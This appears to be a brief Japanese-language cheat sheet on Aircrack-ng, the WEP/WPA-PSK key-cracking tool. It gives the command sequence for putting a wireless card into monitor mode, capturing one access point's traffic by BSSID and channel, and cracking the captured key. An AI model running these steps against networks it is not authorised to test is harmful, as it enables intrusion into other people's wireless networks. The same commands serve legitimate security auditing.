# Aircrack-ng
- [What's Aircrack-ng](#what's-aircrack-ng)
- [How To use](#how-to-use)

## What's Aircrack-ng
>Aircrack-ngはWEPキーをクラックするフリーソフトウェアAircrackを元に作られたプログラムで、従来のAircrackには無かった多くの機能が実装された。オープンソース(GPL)で配布されており、自由に利用できる。従来のAircrackには無かったKoreK攻撃やPTW攻撃が実装されており、IVを多く集めなくてもWEPキーをクラックすることが可能になった。

WEPキーやWPA-PSKキーをクラックするためのツール

## How To use
```sh
iwconfig

# モード変更
airmon-ng check kill
airmon-ng start wlan0
iwconfig

# アクセスポイントの情報取得
airodump-ng wlan0mon

# 情報をファイル化
cd /Path/to/wepsave
airodump-ng --bssid 80:3F:5D:42:D9:11 --channel 5 --write wep wlan0mon

# 取得したデータの解析
aircrack-ng wep-01.cap wlan0mon
```